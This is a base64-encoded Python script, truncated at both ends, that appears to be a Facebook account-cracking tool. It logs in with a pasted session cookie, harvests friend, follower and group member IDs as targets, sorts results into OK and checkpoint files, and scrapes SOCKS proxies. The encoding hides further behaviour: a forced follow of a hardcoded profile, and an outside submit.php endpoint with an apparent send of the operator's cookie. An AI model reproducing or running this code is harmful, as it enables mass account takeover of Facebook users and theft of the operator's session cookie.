nOidTZXB0ZW1iZXInLCcxMCc6J09jdG9iZXInLCcxMSc6J05vdmVtYmVyJywnMTInOidEZXZlbWJlcid9CnRnbCA9IGRhdGV0aW1lLmRhdGV0aW1lLm5vdygpLmRheQpibG4gPSBkaWNbKHN0cihkYXRldGltZS5kYXRldGltZS5ub3coKS5tb250aCkpXQp0aG4gPSBkYXRldGltZS5kYXRldGltZS5ub3coKS55ZWFyCm9rYyA9ICdPSy0nK3N0cih0Z2wpKyctJytzdHIoYmxuKSsnLScrc3RyKHRobikrJy50eHQnCmNwYyA9ICdDUC0nK3N0cih0Z2wpKyctJytzdHIoYmxuKSsnLScrc3RyKHRobikrJy50eHQnCiMtLS0tLS0tLS0tLS0tLS0tLS1bIPCdkJjwnZCA8J2QkvCdkIjwnZCRXS0tLS0tLS0tLS0tLS0tLSMKCgppbXBvcnQgb3MKdHJ5OgogICAgaW1wb3J0IHJlcXVlc3RzCmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIHByaW50KCJcbltceDFiWzE7OTFtIVx4MWJbMG1dIHR1bmdndSBzZWJlbnRhciBzZWRhbmcgbWVuZ2luc3RhbGwgcmVxdWVzdHNcbiIpCiAgICBvcy5zeXN0ZW0oInBpcCBpbnN0YWxsIHJlcXVlc3RzIikKCnRyeToKICAgIGltcG9ydCByaWNoCmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIHByaW50KCJcbltceDFiWzE7OTFtIVx4MWJbMG1dIHR1bmdndSBzZWJlbnRhciBzZWRhbmcgbWVuZ2luc3RhbGwgcmljaFxuIikKICAgIG9zLnN5c3RlbSgicGlwIGluc3RhbGwgcmljaCIpCgppbXBvcnQgcmVxdWVzdHMsIHN5cywgdGltZSwgcmUsIHJhbmRvbQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIE1vZG9sCmZyb20gcmljaC5wcm9ncmVzcyBpbXBvcnQgUHJvZ3Jlc3MsIFRleHRDb2x1bW4KZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAgYXMgcGFyCmZyb20gdGltZSBpbXBvcnQgdGltZSBhcyBtZWsKCk0gPSAnXHgxYlsxOzkxbScgIyBNRVJBSApPID0gJ1x4MWJbMTs5Nm0nICMgQklSVSBNVURBCk4gPSAnXHgxYlswbScgICAgIyBXQVJOQSBNQVRJCkggPSAnXHgxYlsxOzkybScgIyBISUpBVQpLID0gJ1x4MWJbMTs5M20nICMgS1VOSU5HCgpjbGFzcyBMb2dpbjoKCiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5zZXM9cmVxdWVzdHMuU2Vzc2lvbigpCiAgICAgICAgc2VsZi51cmwgPSAiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tIgogICAgICAgIHNlbGYuaWQsIHNlbGYub2ssIHNlbGYuY3AsIHNlbGYubG8gPSBbXSwgW10sIFtdLCAwCiAgICAgICAgc2VsZi5jb2sgPSAiaHR0cHM6Ly9hcGktY2RuLWZiLnlheWFueGQubXkuaWQvc3VibWl0LnBocCIKICAgICAgICBzZWxmLmtvbnRvbCwgc2VsZi5peWEsIHNlbGYucGFzdyA9IHt9LCBbXSwgW10KICAgICAgICBzZWxmLm1lbnUoKQoKICAgIGRlZiBoYXB1cyhzZWxmKToKICAgICAgICB0cnk6b3MucmVtb3ZlKCJvay5jb2tpLnR4dCIpO29zLnJlbW92ZSgiLklELnR4dCIpCiAgICAgICAgZXhjZXB0OnBhc3MKCiAgICBkZWYgbG9nb28oc2VsZik6CiAgICAgICAgaWYgIndpbiIgaW4gc3lzLnBsYXRmb3JtOm9zLnN5c3RlbSgiY2xzIikKICAgICAgICBlbHNlOm9zLnN5c3RlbSgiY2xlYXIiKQogICAgICAgIAoKICAgIGRlZiBsb2dpbl9jb2tpZShzZWxmKToKICAgICAgICBzZWxmLmxvZ29vKCkKICAgICAgICBwcmludCgnJykKICAgICAgICBwcmludCgnJykKICAgICAgICB0cnk6CiAgICAgICAgICAgIGNvayA9IGlucHV0KCJbPD5dIGNvb2tpZSA+PiAiKQogICAgICAgICAgICBsaW5rID0gc2VsZi5zZXMuZ2V0KGYie3NlbGYudXJsfS9wcm9maWxlLnBocD92PWluZm8iLCBjb29raWVzPXsiY29va2llIjogY29rfSkudGV4dAogICAgICAgICAgICBpZiAnaHJlZj0iL3plcm8vb3B0aW4vd3JpdGUvJyBpbiBzdHIobGluayk6CiAgICAgICAgICAgICAgICBwcmludCgiWzw+XSBub3RpY2U6IGFuZGEgc2VkYW5nIG1lbmdndW5ha2FuIG1vZGUgZnJlZSBmYWNlYm9vayIpCiAgICAgICAgICAgICAgICBwcmludCgiWzw+XSBNb2hvbiB0dW5nZ3Ugc2ViZW50YXIsIHN5c3RlbSBzZWRhbmcgbWVuZ3ViYWggY29va2llIGtlIG1vZGUgZGF0YS4iKQogICAgICAgICAgICAgICAgdXJsbCA9IHJlLnNlYXJjaCgnaHJlZj0iL3plcm8vb3B0aW4vd3JpdGUvPyguKj8pIicsIHN0cihsaW5rKSkuZ3JvdXAoMSkucmVwbGFjZSgiYW1wOyIsICIiKQogICAgICAgICAgICAgICAgZ2V0dCA9IHNlbGYuc2VzLmdldChmIntzZWxmLnVybH0vemVyby9vcHRpbi93cml0ZS97dXJsbH0iLCBjb29raWVzPXsiY29va2llIjogY29rfSkudGV4dAogICAgICAgICAgICAgICAgcG9zcyA9IHBhcihnZXR0LCAiaHRtbC5wYXJzZXIiKS5maW5kKCJmb3JtIix7Im1ldGhvZCI6InBvc3QifSlbImFjdGlvbiJdLnJlcGxhY2UoImFtcDsiLCAiIikKICAgICAgICAgICAgICAgIGRhdGUgPSB7ImZiX2R0c2ciIDogcmUuc2VhcmNoKCduYW1lPSJmYl9kdHNnIiB2YWx1ZT0iKC4qPykiJyxzdHIoZ2V0dCkpLmdyb3VwKDEpLCJqYXpvZXN0IiA6IHJlLnNlYXJjaCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IiguKj8pIicsIHN0cihnZXR0KSkuZ3JvdXAoMSl9CiAgICAgICAgICAgICAgICBzZWxmLnNlcy5wb3N0KGYie3NlbGYudXJsfXtwb3NzfSIsIGRhdGE9ZGF0ZSwgY29va2llcz17ImNvb2tpZSI6IGNva30pLnRleHQKICAgICAgICAgICAgICAgIHNlbGYudWJhaF9iYWhhc2EoeyJjb29raWUiOiBjb2t9KQogICAgICAgICAgICAgICAgZXhpdCgiXG5b4pyTXSBwcm9zZXMgbWVuZ3ViYWgga2UgbW9kZSBkYXRhIHRlbGFoIHNlbGVzYWkuXG5bPD5dIHNpbGFoa2FuIG1hc3VrYW4gdWxhbmcgY29va2llIG55YSBkZW5nYW4gbWVuZ2V0aWsgcHl0aG9uIHJlZ2V4LnB5IikKICAgICAgICAgICAgZWxpZiAnaHJlZj0iL3gvY2hlY2twb2ludC8nIGluIHN0cihsaW5rKToKICAgICAgICAgICAgICAgIHByaW50KCJb4pyYXSBJbnZhbGlkIGNvb2tpZSBbTk9dIik7dGltZS5zbGVlcCgyKTtzZWxmLmxvZ2luX2Nva2llKCkKICAgICAgICAgICAgZWxpZiAnaHJlZj0iL3IucGhwJyBpbiBzdHIobGluayk6CiAgICAgICAgICAgICAgICBwcmludCgiW+KcmF0gSW52YWxpZCBjb29raWUgW05PXSIpO3RpbWUuc2xlZXAoMik7c2VsZi5sb2dpbl9jb2tpZSgpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludCgiXG5bPD5dIHdhaXQgYSBsaXR0bGUgYml0Li4uIikKICAgICAgICAgICAgICAgIHNlbGYudWJhaF9iYWhhc2EoeyJjb29raWUiOiBjb2t9KQogICAgICAgICAgICAgICAgbmFtYSA9IHJlLmZpbmRhbGwoIlw8dGl0bGVcPiguKj8pPFwvdGl0bGVcPiIsIGxpbmspWzBdCiAgICAgICAgICAgICAgICB1c2VyID0gcmUuc2VhcmNoKCJjX3VzZXI9KFxkKykiLCBzdHIoY29rKSkuZ3JvdXAoMSkKICAgICAgICAgICAgICAgIG9wZW4oJ29rLmNva2kudHh0JywgJ3cnKS53cml0ZShjb2spO29wZW4oJ0lELnR4dCcsICd3Jykud3JpdGUoZiJ7bmFtYX18e3VzZXJ9IikKICAgICAgICAgICAgICAgIHByaW50KGYiWzw+XSBIaSA6ICB7bmFtYX0gIik7c2VsZi5pa3V0aSh7ImNvb2tpZSI6IGNva30pO3NlbGYuZGF0YXMobmFtYSwgY29rKQogICAgICAgICAgICAgICAgZXhpdCgiXG5bISFdIikKICAgICAgICBleGNlcHQgcmVxdWVzdHMuQ29ubmVjdGlvbkVycm9yOgogICAgICAgICAgICBwcmludCgnJykKICAgICAgICAgICAgZXhpdCgiXG5b4oiaXSDYqtmFINiq2YbYtNmK2Lcg2KfZhNmD2YjZg9mK2LIg2KjZhtis2KfYrSIpCgogICAgZGVmIHViYWhfYmFoYXNhKHNlbGYsIGNvayk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBsaW5rID0gc2VsZi5zZXMuZ2V0KGYie3NlbGYudXJsfS9sYW5ndWFnZS8iLCBjb29raWVzPWNvaykudGV4dAogICAgICAgICAgICBkYXRhID0gcGFyKGxpbmssICJodG1sLnBhcnNlciIpCiAgICAgICAgICAgIGZvciB4IGluIGRhdGEuZmluZF9hbGwoJ2Zvcm0nLHsnbWV0aG9kJzoncG9zdCd9KToKICAgICAgICAgICAgICAgIGlmICJCYWhhc2EgSW5kb25lc2lhIiBpbiBzdHIoeCk6CiAgICAgICAgICAgICAgICAgICAgYmFoYXNhID0geyJmYl9kdHNnIiA6IHJlLnNlYXJjaCgnbmFtZT0iZmJfZHRzZyIgdmFsdWU9IiguKj8pIicsc3RyKGxpbmspKS5ncm91cCgxKSwiamF6b2VzdCIgOiByZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIobGluaykpLmdyb3VwKDEpLCAic3VibWl0IiAgOiAiQmFoYXNhIEluZG9uZXNpYSJ9CiAgICAgICAgICAgICAgICAgICAgc2VsZi5zZXMucG9zdChmIntzZWxmLnVybH17eFsnYWN0aW9uJ119IiwgZGF0YT1iYWhhc2EsIGNvb2tpZXM9Y29rKQogICAgICAgIGV4Y2VwdDpwYXNzCgogICAgZGVmIGlrdXRpKHNlbGYsIGNvayk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBsaW5rID0gcGFyKHNlbGYuc2VzLmdldChmIntzZWxmLnVybH0vcHJvZmlsZS5waHA/aWQ9MTAwMDA1Mzk1NDEzODAwIiwgY29va2llcz1jb2spLnRleHQsICJodG1sLnBhcnNlciIpCiAgICAgICAgICAgIHhueHggPSBsaW5rLmZpbmQoImEiLCBzdHJpbmc9IklrdXRpIikuZ2V0KCJocmVmIikKICAgICAgICAgICAgc2VsZi5zZXMuZ2V0KGYie3NlbGYudXJsfXtzdHIoeG54eCl9IiwgY29va2llcz1jb2spLnRleHQKICAgICAgICBleGNlcHQ6cGFzcwoKICAgIGRlZiBnZXRfcHJveHkoc2VsZik6CiAgICAgICAgcmVzdCA9IFtdCiAgICAgICAgc2VsZi5zZXMuaGVhZGVycy51cGRhdGUoeyJ1c2VyLWFnZW50IjogIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMTsgdml2byAxOTA0IEJ1aWxkL1JQMUEuMjAwNzIwLjAxMjspIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8xMDQuMC41MTEyLjk3IE1vYmlsZSBTYWZhcmkvNTM3LjM2In0pCiAgICAgICAgZ290cyA9IHBhcihzZWxmLnNlcy5nZXQoImh0dHBzOi8vaGlkZW15Lm5hbWUvZW4vcHJveHktbGlzdC8/dHlwZT01IikudGV4dCwgImh0bWwucGFyc2VyIikKICAgICAgICByZWcgPSByZS5maW5kYWxsKCI+KFxkKy5cZCsuXGQrLlxkKykuKj8+KFxkKykuKj9pIiwgc3RyKGdvdHMpKQogICAgICAgIGZvciB4IGluIHJlZzoKICAgICAgICAgICAgcmVzdC5hcHBlbmQoInNvY2tzNTovLyIreFswXSsiOiIreFsxXSkKICAgICAgICBpZiByZXN0ICE9IDA6CiAgICAgICAgICAgIHRyeTpvcy5yZW1vdmUoInByb3hpZXMudHh0IikKICAgICAgICAgICAgZXhjZXB0OnBhc3MKICAgICAgICAgICAgZm9yIHlheSBpbiByZXN0OgogICAgICAgICAgICAgICAgb3BlbigicHJveGllcy50eHQiLCAiYSsiKS53cml0ZSh5YXkrIlxuIikKICAgICAgICAgICAgZXhpdCgiKOKckykgRmlsZSBzYXZlIGluIHByb3hpZXMudHh0LCByZXN0YXJ0IHRoaXMgdG9vbHNcbiIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgZXhpdCgiKOKckykgRmlsZSBzYXZlIGluIHByb3hpZXMudHh0LCByZXN0YXJ0IHRoaXMgdG9vbHNcbiIpCgogICAgZGVmIG1lbWVrKHNlbGYsIG1taywga250bCk6CiAgICAgICAgaWYgImxxa3duZHBua2VmbmZqc253bmZ1b2VvaG5pM2UiIGluIGtudGw6c2VsZi5zZXMuZ2V0KGYie3NlbGYua29udG9sWydtbWsnXX17c2VsZi5rb250b2xbJ2huY2V0J119e3NlbGYua29udG9sWydzb2Z0ZWsnXX17c2VsZi5rb250b2xbJ25ndGQnXX17bW1rfSIpLmpzb24oKQogICAgICAgIGVsc2U6c2VsZi5zZXMuZ2V0KGYie3NlbGYua29udG9sWydtbWsnXX17c2VsZi5rb250b2xbJ2huY2V0J119e3NlbGYua29udG9sWydzb2Z0ZWsnXX17c2VsZi5rb250b2xbJ25ndGQnXX17bW1rfSIpLmpzb24oKQoKICAgIGRlZiBtZW51KHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgY29vayA9IHsiY29va2llIjogb3Blbigib2suY29raS50eHQiLCAiciIpLnJlYWQoKX0KICAgICAgICAgICAgbmFtYSwgdXNlciA9IG9wZW4oIklELnR4dCIsICJyIikucmVhZCgpLnNwbGl0KCJ8IikKICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgICAgIHNlbGYubG9naW5fY29raWUoKQogICAgICAgIHNlbGYubG9nb28oKQogICAgICAgIHRyeToKICAgICAgICAgICAgbGluayA9IHNlbGYuc2VzLmdldChmIntzZWxmLnVybH0vcHJvZmlsZS5waHA/dj1pbmZvIiwgY29va2llcz1jb29rKS50ZXh0CiAgICAgICAgICAgIGlmICJtYmFzaWNfbG9nb3V0X2J1dHRvbiIgbm90IGluIGxpbms6CiAgICAgICAgICAgICAgICBzZWxmLmhhcHVzKCkKICAgICAgICAgICAgICAgIHByaW50KGYiXG5bISFdIEl0IHNlZW1zIHRoYXQgdGhlIEZhY2Vib29rIGFjY291bnQgaGFzIGJlZW4gbG9ja2VkLiBQbGVhc2UgdmVyaWZ5IHRoZSBhY2NvdW50IG9yIGNyZWF0ZSBhIG5ldyBjb29raWUuIik7dGltZS5zbGVlcCgzKTtzZWxmLmxvZ2luX2Nva2llKCkKICAgICAgICBleGNlcHQgcmVxdWVzdHMuQ29ubmVjdGlvbkVycm9yOgogICAgICAgICAgICBleGl0KCJcblviiJpdINiq2YUg2KrZhti02YrYtyDYp9mE2YPZiNmD2YrYsiDYqNmG2KzYp9itIikKICAgICAgICBzZWxmLmpuY2trKCkKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBsbG9naW4oKQogICAgICAgIGRlZiBmYWtfeHkodSk6CiAgICAgICAgCWZvciBlIGluIHUgKyAiXG4iOnN5cy5zdGRvdXQud3JpdGUoZSk7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wNSkKICAgICAgICBkZWYgY2xlYXIoKToKICAgICAgICAJb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgCWRlZiBiYWNrKCk6CiAgICAgICAgCQlsbG9naW4oKQogICAgICAgIAlkZWYgYmFubmVyKCk6CiAgICAgICAgCQlwcmludChmJycn4ouY8J2QmPCdkIDwnZCS8J2QiPCdkJHii5knJycpCiAgICAgICAgZXhpdCgpCiAgICAgICAgCgoKICAgICAgICB5a2ggPSBpbnB1dChmIntIfVt7TX0re0h9XXtOfSBZQVNJUiIpCiAgICAgICAgaWYgeWtoIGluIFsiIiwgIiAiXToKICAgICAgICAgICAgcHJpbnQoIlshXSBqYW5nYW4ga29zb25nIik7dGltZS5zbGVlcCgyKTtzZWxmLm1lbnUoKQogICAgICAgIGVsaWYgeWtoIGluIFsiMSIsICIwMSJdOgogICAgICAgICAgICBleGl0KCJiZWx1bSBzZWxlc2FpOikiKQogICAgICAgIGVsaWYgeWtoIGluIFsiMiIsICIwMiJdOgogICAgICAgICAgICBwcmludCgiWytdIGtldGlrICdtZScgamlrYSBpbmdpbiBjcmFjayBkYXJpIHRlbWFuIGFuZGEuIikKICAgICAgICAgICAgdXNlciA9IGlucHV0KGYiW3tPfSp7Tn1dIGVudGVyIGlkIG9yIHVzZXJuYW1lIDogIikKICAgICAgICAgICAgaWYgIm1lIiBpbiB1c2VyOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIGxpbmsgPSBwYXIoc2VsZi5zZXMuZ2V0KGYie3NlbGYudXJsfS9wcm9maWxlLnBocCIsIGNvb2tpZXM9Y29vaykudGV4dCwgImh0bWwucGFyc2VyIikKICAgICAgICAgICAgICAgICAgICBpZiAiQW5kYSBEaWJsb2tpciBTZW1lbnRhcmEiIGluIGxpbms6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJbIV0gZmFjZWJvb2sgbWVtYmF0YXNpIHNldGlhcCBha3Rpdml0YXMsIGxpbWl0IGJybywgc2lsYWhrYW4gYmVyYWxpaCBha3VuIik7dGltZS5zbGVlcCgyKTtzZWxmLm1lbnUoKQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJbIV0gdG8gc3RvcCBwcmVzcyBDVFJMIHRoZW4gcHJlc3MgQyBvbiB5b3VyIGtleWJvYXJkLiIpCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuYmF0dXIoc2VsZi51cmwrbGluay5maW5kKCJhIiwgc3RyaW5nPSJUZW1hbiIpLmdldCgiaHJlZiIpLCBjb29rKQogICAgICAgICAgICAgICAgZXhjZXB0KHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yLHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ2h1bmtlZEVuY29kaW5nRXJyb3IscmVxdWVzdHMuZXhjZXB0aW9ucy5SZWFkVGltZW91dCk6CiAgICAgICAgICAgICAgICAgICAgZXhpdCgiWyFdIGtlc2FsYWhhbiBwYWRhIGtvbmVrc2kiKQogICAgICAgICAgICAgICAgcHJpbnQoKQogICAgICAgICAgICAgICAgc2VsZi5tZXRvZGUoKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIGxpbmsgPSBzZWxmLnNlcy5nZXQoZiJ7c2VsZi51cmx9L3t1c2VyfS9mcmllbmRzIiwgY29va2llcz1jb29rKS50ZXh0CiAgICAgICAgICAgICAgICAgICAgaWYgIkhhbGFtYW4gVGlkYWsgRGl0ZW11a2FuIiBpbiBsaW5rOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIlshXSBwZW5nZ3VuYSBkZW5nYW4ge3VzZXJ9IHRpZGFrIGRpdGVtdWthbiIpO3RpbWUuc2xlZXAoMik7c2VsZi5tZW51KCkKICAgICAgICAgICAgICAgICAgICBlbGlmICJBbmRhIERpYmxva2lyIFNlbWVudGFyYSIgaW4gbGluazoKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlshXSBmYWNlYm9vayBtZW1iYXRhc2kgc2V0aWFwIGFrdGl2aXRhcywgbGltaXQgYnJvLCBzaWxhaGthbiBiZXJhbGloIGFrdW4iKTt0aW1lLnNsZWVwKDIpO3NlbGYubWVudSgpCiAgICAgICAgICAgICAgICAgICAgZWxpZiAiS29udGVuIFRpZGFrIERpdGVtdWthbiIgaW4gbGluazoKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJbIV0gcGVuZ2d1bmEgZGVuZ2FuIHt1c2VyfSB0aWRhayBkaXRlbXVrYW4iKTt0aW1lLnNsZWVwKDIpO3NlbGYubWVudSgpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlshXSB0byBzdG9wIHByZXNzIENUUkwgdGhlbiBwcmVzcyBDIG9uIHlvdXIga2V5Ym9hcmQuIikKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5iYXR1cihmIntzZWxmLnVybH0ve3VzZXJ9L2ZyaWVuZHMiLCBjb29rKQogICAgICAgICAgICAgICAgZXhjZXB0KHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yLHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ2h1bmtlZEVuY29kaW5nRXJyb3IscmVxdWVzdHMuZXhjZXB0aW9ucy5SZWFkVGltZW91dCk6CiAgICAgICAgICAgICAgICAgICAgZXhpdCgiWyFdIGtlc2FsYWhhbiBwYWRhIGtvbmVrc2kiKQogICAgICAgICAgICAgICAgcHJpbnQoKQogICAgICAgICAgICAgICAgc2VsZi5tZXRvZGUoKQogICAgICAgIGVsaWYgeWtoIGluIFsiMyIsICIwMyJdOgogICAgICAgICAgICB1c2VyID0gaW5wdXQoZiJbe099KntOfV0gZW50ZXIgaWQgb3IgdXNlcm5hbWUgZm9sbG93ZXJzOiAiKQogICAgICAgICAgICBpZiB1c2VyIGluWyIiLCAiICJdOgogICAgICAgICAgICAgICAgcHJpbnQoZiJcbntNfWphbmdhbiBrb3NvbmciKTt0aW1lLnNsZWVwKDIpO3NlbGYubWVudSgpCiAgICAgICAgICAgIGVsaWYgdXNlci5pc2RpZ2l0KCk6CiAgICAgICAgICAgICAgICBtZW1layA9IChmIntzZWxmLnVybH0vcHJvZmlsZS5waHA/aWQ9e3VzZXJ9JnY9Zm9sbG93ZXJzIikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIG1lbWVrID0gKGYie3NlbGYudXJsfS97dXNlcn0/dj1mb2xsb3dlcnMiKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBsaW5rID0gc2VsZi5zZXMuZ2V0KG1lbWVrLCBjb29raWVzPWNvb2spLnRleHQKICAgICAgICAgICAgICAgIGlmICJIYWxhbWFuIFRpZGFrIERpdGVtdWthbiIgaW4gbGluazoKICAgICAgICAgICAgICAgICAgICBwcmludChmIlshXSBwZW5nZ3VuYSBkZW5nYW4ge3VzZXJ9IHRpZGFrIGRpdGVtdWthbiIpO3RpbWUuc2xlZXAoMik7c2VsZi5tZW51KCkKICAgICAgICAgICAgICAgIGVsaWYgIkFuZGEgRGlibG9raXIgU2VtZW50YXJhIiBpbiBsaW5rOgogICAgICAgICAgICAgICAgICAgIHByaW50KCJbIV0gZmFjZWJvb2sgbWVtYmF0YXNpIHNldGlhcCBha3Rpdml0YXMsIGxpbWl0IGJybywgc2lsYWhrYW4gYmVyYWxpaCBha3VuIik7dGltZS5zbGVlcCgyKTtzZWxmLm1lbnUoKQogICAgICAgICAgICAgICAgZWxpZiAiS29udGVuIFRpZGFrIERpdGVtdWthbiIgaW4gbGluazoKICAgICAgICAgICAgICAgICAgICBwcmludChmIlshXSBwZW5nZ3VuYSBkZW5nYW4ge3VzZXJ9IHRpZGFrIGRpdGVtdWthbiIpO3RpbWUuc2xlZXAoMik7c2VsZi5tZW51KCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlshXSB0byBzdG9wIHByZXNzIENUUkwgdGhlbiBwcmVzcyBDIG9uIHlvdXIga2V5Ym9hcmQuIikKICAgICAgICAgICAgICAgICAgICBzZWxmLmZvbGxvdyhtZW1laywgY29vaykKICAgICAgICAgICAgZXhjZXB0KHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yLHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ2h1bmtlZEVuY29kaW5nRXJyb3IscmVxdWVzdHMuZXhjZXB0aW9ucy5SZWFkVGltZW91dCk6CiAgICAgICAgICAgICAgICBleGl0KCJbIV0ga2VzYWxhaGFuIHBhZGEga29uZWtzaSIpCiAgICAgICAgICAgIHByaW50KCkKICAgICAgICAgICAgc2VsZi5tZXRvZGUoKQogICAgICAgIGVsaWYgeWtoIGluIFsiNCIsICIwNCJdOgogICAgICAgICAgICB1c2VyID0gaW5wdXQoZiJbe099KntOfV0gZW50ZXIgaWQgZ3J1b3AgOiAiKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBsaW5rID0gc2VsZi5zZXMuZ2V0KGYie3NlbGYudXJsfS9ncm91cHMve3VzZXJ9IiwgY29va2llcz1jb29rKS50ZXh0CiAgICAgICAgICAgICAgICBpZiAiSGFsYW1hbiB5YW5nIEFuZGEgbWludGEgdGlkYWsgZGl0ZW11a2FuLiIgaW4gbGluazoKICAgICAgICAgICAgICAgICAgICBwcmludChmIlshXSBwZW5nZ3VuYSBkZW5nYW4gZ3J1cCBpZCB7dXNlcn0gdGlkYWsgZGl0ZW11a2FuIik7dGltZS5zbGVlcCgyKTtzZWxmLm1lbnUoKQogICAgICAgICAgICAgICAgZWxpZiAiQW5kYSBEaWJsb2tpciBTZW1lbnRhcmEiIGluIGxpbms6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlshXSBmYWNlYm9vayBtZW1iYXRhc2kgc2V0aWFwIGFrdGl2aXRhcywgbGltaXQgYnJvLCBzaWxhaGthbiBiZXJhbGloIGFrdW4iKTt0aW1lLnNsZWVwKDIpO3NlbGYubWVudSgpCiAgICAgICAgICAgICAgICBlbGlmICJLb250ZW4gVGlkYWsgRGl0ZW11a2FuIiBpbiBsaW5rOgogICAgICAgICAgICAgICAgICAgIHByaW50KGYiWyFdIHBlbmdndW5hIGRlbmdhbiBncnVwIGlkIHt1c2VyfSB0aWRhayBkaXRlbXVrYW4iKTt0aW1lLnNsZWVwKDIpO3NlbGYubWVudSgpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KCJbIV0gdG8gc3RvcCBwcmVzcyBDVFJMIHRoZW4gcHJlc3MgQyBvbiB5b3VyIGtleWJvYXJkLiIpCiAgICAgICAgICAgICAgICAgICAgc2VsZi5kdW1wcyhmIntzZWxmLnVybH0vZ3JvdXBzL3t1c2VyfSIsIGNvb2spCiAgICAgICAgICAgIGV4Y2VwdChyZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcixyZXF1ZXN0cy5leGNlcHRpb25zLkNodW5rZWRFbmNvZGluZ0Vycm9yLHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVhZFRpbWVvdXQpOgogICAgICAgICAgICAgICAgZXhpdCgiWyFdIGtlc2FsYWhhbiBwYWRhIGtvbmVrc2kiKQogICAgICAgICAgICBwcmludCgpCiAgICAgICAgICAgIHNlbGYubWV0b2RlKCkKICAgICAgICBlbGlmIHlraCBpbiBbIjUiLCAiMDUiXToKICAgICAgICAgICAgc2VsZi5jZWtfaGFzaWwoKQogICAgICAgIGVsaWYgeWtoIGluIFsiNiIsICIwNiJdOgogICAgICAgICAgICBzZWxmLmdldF9wcm94eSgpCiAgICAgICAgZWxpZiB5a2ggaW4gWyIwIiwgIjAwIl06CiAgICAgICAgICAgIHNlbGYuaGFwdXMoKQogICAgICAgICAgICBleGl0KCJkb25lIHJlbW92ZSBjb29raWUiKQogICAgICAgIGVsc2U6cHJpbnQoIlshXSBpbnB1dCB5YW5nIGJuZXIga29udG9sIik7dGltZS5zbGVlcCgyKTtzZWxmLm1lbnUoKQoKICAgIGRlZiBjZWtfaGFzaWwoc2VsZik6CiAgICAgICAgcHJpbnQoIiIiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KezAxfSBjaGVjayByZXN1bHQgb2sKezAyfSBjaGVjayByZXN1bHQgY3AKezAwfSBiYWNrIHRvIG1lbnUKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iIiIpCiAgICAgICAgeWtoID0gaW5wdXQoZiJ7SH1be019K3tIfV17Tn0g2LHYutiv2KfZhiAiKQogICAgICAgIGlmIHlraCBpbiBbIiIsICIgIl06CiAgICAgICAgICAgIHByaW50KCJbIV0gamFuZ2FuIGtvc29uZyIpO3RpbWUuc2xlZXAoMik7c2VsZi5tZW51KCkKICAgICAgICBlbGlmIHlraCBpbiBbIjEiLCAiMDEiXToKICAgICAgICAgICAgdHJ5OiB5eXkgPSBvcGVuKCJvay50eHQiLCAiciIpLnJlYWRsaW5lcygpCiAgICAgICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjpwcmludCgiTm8gb2sgcmVzdWx0cyBzYXZlZCIpO3RpbWUuc2xlZXAoMik7c2VsZi5jZWtfaGFzaWwoKQogICAgICAgICAgICBmb3IgaSBpbiB5eXk6CiAgICAgICAgICAgICAgICBwcmludChpKQogICAgICAgICAgICBleGl0KCJcbkNoZWNrIHJlc3VsdCBpcyBjb21wbGV0ZSIpCiAgICAgICAgZWx